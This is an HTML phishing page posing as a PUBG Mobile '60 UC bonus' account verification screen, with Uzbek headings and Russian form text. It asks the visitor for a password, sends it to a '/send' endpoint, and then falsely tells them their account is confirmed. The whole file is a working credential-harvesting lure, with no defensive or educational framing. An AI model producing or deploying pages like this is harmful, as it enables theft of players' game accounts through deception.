<!DOCTYPE html>
<html>
<head>
    <title>Password</title>

    <!-- TELEFON UCHUN -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        body {
            margin: 0;
            height: 100vh;
            background: url("https://static3.tgstat.ru/channels/_0/84/84149ba14092fab307e0cf55c791a8a1.jpg") no-repeat center center/cover;
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            position: relative;
        }

        /* 🔥 OVERLAY */
        body::before {
            content: "";
            position: absolute;
            inset: 0;
            background: rgba(0,0,0,0.7);
            z-index: 0;
        }

        .main {
            width: 900px;
            height: 500px;
            display: flex;
            padding: 40px;
            position: relative;
            z-index: 1;
            backdrop-filter: blur(12px);
            background: rgba(0,0,0,0.4);
            border-radius: 20px;
            box-shadow: 0 0 40px rgba(0,0,0,0.9);
        }

        .left {
            flex: 1;
        }

        .title {
            font-size: 30px;
            font-weight: bold;
            line-height: 1.4;
        }

        /* 💎 TITLE STYLE */
        .title span {
            display: block;
            font-size: 34px;
            color: #00f2fe;
            margin-bottom: 10px;
            text-shadow: 0 0 12px #00f2fe;
        }

        .right {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        /* 🔥 INPUT */
        input {
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            background: rgba(0, 0, 0, 0.75);
            border: 2px solid rgba(255,255,255,0.3);
            color: white;
            font-size: 18px;
            outline: none;
            backdrop-filter: blur(6px);
            box-shadow: 0 0 10px rgba(0,0,0,0.7);
            transition: 0.3s;
        }

        input::placeholder {
            color: rgba(255,255,255,0.7);
        }

        input:focus {
            border: 2px solid #00f2fe;
            box-shadow: 0 0 15px #00f2fe;
            background: rgba(0, 0, 0, 0.9);
        }

        /* 👁 SHOW PASSWORD */
        .show-pass {
            margin-top: 10px;
            font-size: 14px;
            cursor: pointer;
            color: #8ab4f8;
        }

        .show-pass:hover {
            text-decoration: underline;
        }

        .bottom {
            margin-top: 30px;
            display: flex;
            justify-content: flex-end;
        }

        /* 🚀 BUTTON */
        button {
            background: linear-gradient(45deg, #4facfe, #00f2fe);
            border: none;
            padding: 12px 28px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            color: white;
            box-shadow: 0 0 15px rgba(0,242,254,0.7);
            transition: 0.3s;
        }

        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 25px rgba(0,242,254,1);
        }

        /* 📱 TELEFON */
        @media (max-width: 768px) {
            .main {
                width: 100%;
                height: auto;
                flex-direction: column;
                padding: 20px;
            }

            .title span {
                font-size: 26px;
            }

            input {
                font-size: 16px;
                padding: 14px;
            }

            .bottom {
                justify-content: center;
            }

            button {
                width: 100%;
                padding: 14px;
            }
        }
    </style>

</head>
<body>

<div class="main">

    <div class="left">
        <div class="title">
            <span>🔐 ACCOUNT VERIFY</span>
            Pubg mobile 60 UC bonus sahifasi ✅
        </div>
    </div>

    <div class="right">

        <input id="msg2" type="password" placeholder="Введите пароль">

        <div class="show-pass" onclick="toggle()">
            👁 Показать пароль
        </div>

        <div class="bottom">
            <button onclick="send2()">Далее</button>
        </div>

    </div>

</div>

<script>
window.onload = () => {
    document.getElementById("msg2").focus();
};

function toggle() {
    const input = document.getElementById("msg2");
    input.type = input.type === "password" ? "text" : "password";
}

function send2() {
    const message = document.getElementById("msg2").value;

    if (!message) {
        alert("Введите пароль");
        return;
    }

    fetch("/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message })
    })
    .then(() => {
        alert("Ваш аккаунт подтверждён");
    });
}
</script>

</body>
</html>
